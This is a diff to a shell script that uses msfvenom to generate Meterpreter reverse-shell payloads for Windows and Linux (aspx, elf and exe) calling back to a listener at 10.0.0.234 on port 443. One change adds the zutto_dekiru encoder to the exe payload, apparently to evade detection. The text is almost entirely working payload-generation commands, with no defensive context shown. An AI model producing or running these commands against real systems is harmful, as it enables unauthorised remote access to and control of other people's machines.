@@ -6,7 +6,7 @@
 
 lHost=10.0.0.234
 lPort=443
-savePath=/home/god/Desktop/temp/
+savePath=/opt/project/temp_bin/
 
 echo $ipAddr
 echo $lPort
@@ -17,7 +17,7 @@ echo $savePath
 ## x64
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort -e x64/zutto_dekiru -f aspx > $savePath/windows_x64_meterpreter_reverse_tcp.aspx
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lHost LPORT=$lPort prependfork=true -f elf > $savePath/linux_x64_meterpreter_reverse_tcp.elf
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe > $savePath/windows_x64_meterpreter_reverse_https.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$lHost LPORT=$lPort -f exe -e x64/zutto_dekiru > $savePath/windows_x64_meterpreter_reverse_https.exe
 
 
 ## x86
